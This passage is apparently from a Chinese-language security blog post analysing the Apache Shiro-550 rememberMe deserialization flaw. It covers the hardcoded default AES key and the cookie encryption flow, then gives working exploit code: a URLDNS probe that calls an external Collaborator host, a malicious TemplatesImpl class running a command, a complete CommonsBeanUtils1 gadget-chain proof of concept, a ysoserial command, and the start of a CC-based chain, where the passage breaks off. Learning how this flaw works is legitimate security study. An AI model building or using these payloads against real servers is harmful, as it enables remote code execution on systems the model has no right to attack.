class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">DEFAULT_CIPHER_KEY_BYTES</span> <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>发现AES加解密使用默认秘钥shiro550一个关键点就是使用默认的秘钥然后使用默认key进行AES加密（具体就不看了，随机生成一个初始向量......）返回得到加密数据字符数组<img src="/img/5-6/14.png">跟进rememberSerializedIdentity<img src="/img/5-6/15.png">将AES加密后数据Base64编码写入cookie里面getCookie，获得到cookie的一些属性设置<img src="/img/5-6/16.png">所以会写入cookie里面的rememberMe字段<p>总结就是使用固定key对序列化数据进行AES加密，然后base64编码后写入cookie里面的rememberMe字段中</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>shiro进行权限校验是通过Filter实现的<br>OncePerRequestFilter#doFilter<br>-&gt;AbstractShiroFilter#doFilterInternal<br>查看对应方法<br><img src="/img/5-6/17.png"><br>跟进createSubject<br><img src="/img/5-6/18.png"><br>buildSubject会调用DefaultSecurityManager中的createSubject<br><img src="/img/5-6/19.png"></p><img src="/img/5-6/20.png">跟进resolvePrincipals<img src="/img/5-6/21.png">继续跟进到AbstractRememberMeManager#getRememberedPrincipals<img src="/img/5-6/22.png">先获取cookie中序列化数据，然后再反序列化<ol><li>调用父类</li></ol><p>CookieRememberMeManager#getRememberedSerializedIdentity<br><img src="/img/5-6/23.png"><br>获取cookie Remeberme字段并base64解码并返回数据<br>接着进入convertBytesToPrincipals方法<br><img src="/img/5-6/24.png"><br>解码后数据解密再反序列化<br>解密与加密对称，也是使用默认秘钥<br><img src="/img/5-6/25.png"><br>反序列化<br><img src="/img/5-6/26.png"></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><h3 id="URLDNS链探测"><a href="#URLDNS链探测" class="headerlink" title="URLDNS链探测"></a>URLDNS链探测</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//URLDNS.java</span> <span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNS</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">HashMap</span> map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URL</span> url<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://e2hvmezvglr70to8gako0p6ycpig65.burpcollaborator.net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Class</span> clazz<span class="token operator">=</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> hashcode<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        System.out.println(hashcode.get(url));</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">serialize</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        unserialize("ser.bin");</span>      <span class="token punctuation">}</span>    <span class="token comment">//序列化</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectOutputStream</span> oos<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token comment">//反序列化</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> <span class="token class-name">Filename</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span><span class="token class-name">ClassNotFoundException</span><span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> ois<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token class-name">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> object<span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> object<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="没有cc依赖"><a href="#没有cc依赖" class="headerlink" title="没有cc依赖"></a>没有cc依赖</h3><p>cb链(CommonsBeanUtils1 )<br>打shiro时cb的版本为1.8.3</p><pre class="language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;    &lt;version&gt;1.8.3&lt;/version&gt;&lt;/dependency&gt;</code></pre><h4 id="cb漏洞点"><a href="#cb漏洞点" class="headerlink" title="cb漏洞点"></a>cb漏洞点</h4><p>Apache Commons 工具集下除了 collections 以外还有 BeanUtils ，它主要用于操控 JavaBean 。</p><ul><li>以 Utils 结尾，一般这都是一个工具类/集</li></ul><p>Commons-BeanUtils 中提供了一个静态方法 PropertyUtils.getProperty ，<br>这个函数其实就是获取Bean中的某个属性的值，<br>而底层是使用反射调用了javaBean的getxxx的方法来获取值的<br>示例如下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">PropertyUtils</span></span><span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CBMethods</span> <span class="token punctuation">{</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>          <span class="token class-name">Person</span> yyjccc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token number">666</span><span class="token punctuation">,</span> <span class="token string">"yyjccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PropertyUtils</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>yyjccc<span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PropertyUtils</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>而在前面cc3链(<a href="https://vxxly2ajy0y.feishu.cn/wiki/UGXuwuGYyiJv1LkFHe8cxljDnce">cc3链</a> )中动态加载字节码的类TemplatesImpl中存在getOutputProperties()，且里面调用了方法newTransformer，而且刚好是javabean的getxxx</p><h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>我们的链子<br><em>PropertyUtils.getProperty函数中会掉到这里</em><br><img src="/img/5-6/27.png"><br>进入getSimpleProperty函数，在这个函数中会使用getxxx函数<br><img src="/img/5-6/28.png"><br>TemplatesImpl中存在getOutputProperties()<br><img src="/img/5-6/29.png"><br>触发newTransformer,从而动态加载了字节码，因为getProperty加载的是get，直接传outputProperties</p><pre class="language-none"><code class="language-none">PropertyUtils.getProperty(templates,"outputProperties");</code></pre><ul><li>查找getProperty的调用点</li></ul><p>在BeanComparator中的compare方法就刚刚好<br><img src="/img/5-6/30.png"></p><ul><li>继续寻找，其实cc2中就有compare，参考cc2中的入口类</li></ul><p>使用PriorityQueue，需要传入一个comparetor，<br>这里直接传BeanComparator，并初始化设置属性property为outputProperties，为了触发getOutputProperties方法<br><img src="/img/5-6/31.png"></p><pre class="language-none"><code class="language-none">BeanComparator&lt;Object&gt; objectBeanComparator = new BeanComparator&lt;&gt;("outputProperties");PriorityQueue&lt;Object&gt; priorityqueue = new PriorityQueue&lt;&gt;(objectBeanComparator);</code></pre><p>这样写是不行的，</p><ul><li>首先解决序列化时候报错</li></ul><img src="/img/5-6/32.png">这是因为在调用add的时候，就会触发该类的compare方法，来寻找该类了，因此就只能通过反射修改<pre class="language-none"><code class="language-none">Class c = transformingComparator.getClass();Field tfactoryfeild = c.getDeclaredField("transformer");tfactoryfeild.setAccessible(true);tfactoryfeild.set(transformingComparator,invokerTransformer);</code></pre>若new的时候传入使用CC2中的comparator，也样也不行，虽然序列化成功，但在打shiro的时候不会成功这是因为我们使用这个构造方法时，使用了common-collection3包里面的函数，而shiro默认没有cc依赖，因此会出错<img src="/img/5-6/33.png">那么只有换个构造方法，使用这个，我们需要传入一个comparartor<img src="/img/5-6/34.png">随便找一个Comparator类<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">BeanComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> objectBeanComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"outputProperties"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">AttrCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>恶意类<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span><span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>#### 最后poc<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">beans<span class="token punctuation">.</span></span><span class="token class-name">Person</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>security<span class="token punctuation">.</span>c14n<span class="token punctuation">.</span>helper<span class="token punctuation">.</span></span><span class="token class-name">AttrCompare</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> cb <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">//CC3</span>        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c1<span class="token operator">=</span>templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> namefield <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        namefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        namefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> bytecodes<span class="token operator">=</span>c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> code<span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes<span class="token operator">=</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>        bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> tfactoryfield <span class="token operator">=</span> c1<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tfactoryfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//CB</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BeanComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> objectBeanComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token string">"outputProperties"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">AttrCompare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//CC2</span>        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> priorityqueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityqueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityqueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> c3 <span class="token operator">=</span> priorityqueue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> comparatorfield <span class="token operator">=</span> c3<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparatorfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparatorfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>priorityqueue<span class="token punctuation">,</span>objectBeanComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        utils<span class="token punctuation">.</span>tools<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>priorityqueue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>ysoserial</strong></p><pre class="language-none"><code class="language-none">java -jar ysoserial-all.jar CommonsBeanutils1 calc &gt;ser.bin</code></pre><p>这里打shiro可能会失败，原因是<strong>ysoserial使用的cb库版本为1.9，可能与shiro自带的cb版本不对，从而失败</strong></p><h3 id="有cc依赖"><a href="#有cc依赖" class="headerlink" title="有cc依赖"></a>有cc依赖</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>常规的链子都会用到Transfer数组，而shiro和tomcat的类加载机制，使其在反序列化的时候无法加载这个数组（具体原因…），导致攻击链失效<br>因此需要避免使用数组，而这条链就是没有使用数组</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>CC3+CC2+CC6<br>动态类加载+InvokeTransformer+TideEntry-hashmap入口类</p><h4 id="再度分析"><a href="#再度分析" class="headerlink" title="再度分析"></a>再度分析</h4><p>使用cc3中的动态类加载<br>将cc3前面部分拿过来</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">//cc3</span><span class="token class-name">TemplatesImpl</span> templates<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> tc<span class="token operator">=</span>templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> namefield <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>namefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>namefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> bytecodefield <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>bytecodefield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//赋给我们的字节码,二维数组，代码会循环遍历</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code<span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">byte</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span>  codes<span class="token operator">=</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span>bytecodefield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Field</span> tfactoryfield <span class="token operator">=</span> tc<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tfactoryfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 